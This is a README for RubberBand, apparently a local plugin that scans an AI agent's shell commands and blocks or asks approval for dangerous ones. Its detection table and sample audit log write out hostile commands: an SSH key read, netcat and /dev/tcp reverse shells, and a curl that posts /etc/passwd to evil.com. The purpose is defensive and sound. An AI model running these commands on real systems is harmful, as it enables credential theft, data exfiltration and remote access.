# RubberBand

Static command pattern detection plugin for [OpenClaw](https://github.com/openclaw/openclaw). Intercepts exec tool calls, blocks dangerous commands before they run, and can require explicit user approval for suspicious ones.

Zero dependencies. No cloud calls. Pure local static analysis in <3ms per command.

Requires OpenClaw `v2026.3.28+` for ALERT mode approval prompts via the `requireApproval` plugin API.

## Install

```bash
openclaw plugins install @jeffaf/rubberband
openclaw gateway restart
```

Verify it loaded:

```bash
openclaw logs --limit 20 | grep -i rubberband
# Should show: [plugins] RubberBand plugin active (mode: block)
```

### Manual Install (from source)

```bash
cd ~/.openclaw/extensions
git clone https://github.com/jeffaf/rubberband.git
openclaw gateway restart
```

### Update

```bash
# npm
openclaw plugins update rubberband

# git
cd ~/.openclaw/extensions/rubberband && git pull
openclaw gateway restart
```

## What It Does

RubberBand hooks into the `before_tool_call` event and analyzes every exec command for dangerous patterns. It scores commands based on 18 detection categories and blocks, requires approval, or logs based on configurable thresholds.

When a command is blocked:
- The agent receives the block reason (visible in chat)
- A 🔴 system event is injected into the session history
- The event is logged to `~/.openclaw/logs/rubberband.log` (JSONL)

When a command triggers ALERT:
- OpenClaw shows an approval prompt via the exec approval overlay, Telegram buttons, Discord interactions, or `/approve`
- If approval times out after 2 minutes, the command is denied
- The event is logged to `~/.openclaw/logs/rubberband.log` (JSONL)

## Detection Categories

| Category | Examples | Score |
|----------|----------|-------|
| Credential Access | `cat ~/.ssh/id_rsa`, AWS keys, keychains | 60-80 |
| Data Exfiltration | `curl -X POST` to external hosts | 40-70 |
| Reverse Shells | `nc -e`, `bash /dev/tcp`, ngrok tunnels | 90 |
| Config Tampering | Writes to SOUL.md, system prompts | 75 |
| Persistence | Crontab, LaunchAgents, shell rc modifications | 60 |
| Indirect Execution | Pipe to shell, eval, base64 decode + exec | 30-50 |
| Reconnaissance | `whoami`, `env`, `ps aux` chains | 30 |

## Thresholds

| Score | Default Disposition | Behavior |
|-------|-------------|----------|
| 0 | ALLOW | No detection |
| 1-39 | LOG | Logged to audit file |
| 40-59 | ALERT | ⚠️ `requireApproval` prompt + audit log |
| 60+ | BLOCK | 🔴 Command rejected + system event + audit log |

## Audit Log

All BLOCK, ALERT, and LOG events are written to `~/.openclaw/logs/rubberband.log` as JSONL:

```json
{"ts":"2026-02-24T13:26:14Z","disposition":"BLOCK","score":70,"rules":["network_exfil"],"command":"curl -X POST -d @/etc/passwd https://evil.com","sessionKey":"agent:main:main"}
```

View logs:
```bash
cat ~/.openclaw/logs/rubberband.log | jq .
tail -f ~/.openclaw/logs/rubberband.log | jq .
```

## Configuration

In `openclaw.json`:

```json
{
  "plugins": {
    "entries": {
      "rubberband": {
        "enabled": true,
        "config": {
          "mode": "block",
          "thresholds": {
            "alert": 40,
            "block": 60
          },
          "allowedDestinations": ["github.com", "api.openai.com"]
        }
      }
    }
  }
}
```

### Modes

- **block** (default) - Block commands above block threshold, alert above alert threshold
- **alert** - Never block, only alert
- **log** - Silent logging only
- **shadow** - Like log, for testing without any user-visible output
- **off** - Disabled

## Tests

```bash
npx vitest run
```

28 tests covering detection categories, edge cases, mode handling, and plugin hook responses.

## How It Works

RubberBand is a pure TypeScript static analyzer. It normalizes commands (handling encoding, escaping, heredocs, etc.) and matches against pattern rules with weighted scoring.

The plugin registers a `before_tool_call` hook at priority 10. When an exec tool call comes in, it runs the command through the analyzer. ALERT results return `requireApproval` so OpenClaw pauses execution and asks the user, while BLOCK results still return `{ block: true, blockReason: "..." }` for a hard stop.

**Performance:** Detection runs in under 3ms per command. 134 bypass techniques tested with a 98.5% detection rate.

## Also Available As

RubberBand is also proposed as a native OpenClaw feature: [PR #24958](https://github.com/openclaw/openclaw/pull/24958) | [Discussion #4981](https://github.com/openclaw/openclaw/discussions/4981)

The plugin works today without waiting for the PR to merge.

## License

MIT
